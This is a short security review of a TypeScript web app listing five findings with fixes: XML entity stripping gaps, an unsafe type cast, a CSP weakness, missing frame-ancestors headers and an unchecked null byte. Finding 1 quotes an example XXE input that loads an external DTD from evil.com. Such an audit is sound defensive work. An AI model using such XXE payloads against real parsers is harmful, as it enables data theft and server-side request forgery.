# Security Review

**Reviewer**: security-reviewer  
**Date**: 2026-04-27

---

## Finding 1: XXE — `stripXmlEntities` is not fully comprehensive

**File**: `src/lib/parser.ts:155-161,188-198`  
**Severity**: Medium  
**Confidence**: High  

`stripXmlEntities` only strips `<!DOCTYPE [...]>` (with internal subset) and `<!ENTITY`, but does not handle external DTD references without internal subset: `<!DOCTYPE foo SYSTEM "http://evil.com/dtd">`. The `preflightXml` guard catches these, but `stripXmlEntities` as defense-in-depth has gaps.

**Fix**: Make `stripXmlEntities` strip all `<!DOCTYPE` variants regardless of form.

---

## Finding 2: `showSaveFilePicker` cast bypasses TypeScript safety

**File**: `src/lib/videoEncoder.ts:214-219`  
**Severity**: Low  
**Confidence**: High  

Double cast `(window as unknown as { showSaveFilePicker: ... })` bypasses TypeScript's type checking.

**Fix**: Use a type declaration file for the File System Access API.

---

## Finding 3: CSP `style-src-attr 'unsafe-inline'` is a known weakness

**File**: `src/app/layout.tsx:66`  
**Severity**: Low  
**Confidence**: High  

Documented as necessary for Tailwind/MapLibre. No immediate fix needed.

---

## Finding 4: No header-based `frame-ancestors` on GitHub Pages — JS frame-buster is sole defense

**File**: `src/app/layout.tsx:53`  
**Severity**: Medium  
**Confidence**: High  

If JavaScript is disabled or fails to load, the page can be framed on GitHub Pages.

**Fix**: Document that GitHub Pages deployments should be fronted by a header-capable CDN.

---

## Finding 5: `basePath` environment variable — null byte not checked

**File**: `src/lib/env.ts:1-9`  
**Severity**: Low  
**Confidence**: High  

`normalizeBasePath` checks for `..` but not for null bytes or control characters.

**Fix**: Add a check for `\0` and other control characters.

---

## Summary

| # | Finding | Severity | Confidence |
|---|---------|----------|------------|
| 1 | XXE stripXmlEntities gaps | Medium | High |
| 2 | showSaveFilePicker type bypass | Low | High |
| 3 | CSP style-src-attr unsafe-inline | Low | High |
| 4 | No header-based frame-ancestors on Pages | Medium | High |
| 5 | basePath null byte not checked | Low | High |
